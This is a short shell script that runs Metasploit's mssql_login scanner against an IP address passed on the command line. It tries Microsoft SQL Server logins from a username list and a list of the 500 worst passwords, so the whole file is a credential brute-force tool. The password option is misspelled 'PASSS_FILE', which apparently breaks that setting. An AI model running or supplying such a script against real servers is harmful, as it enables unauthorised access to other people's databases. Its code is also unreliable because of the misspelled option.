if [ $# -eq 0 ]; then
  echo "Please pass in a ip"
else

msfconsole -x "use auxiliary/scanner/mssql/mssql_login;
    set RHOSTS $1;
    set USER_FILE ./fastlists/mssql-usernames.txt;
    set PASSS_FILE ./fastlists/500-worst-passwords.txt;
    run;
    exit
    "
fi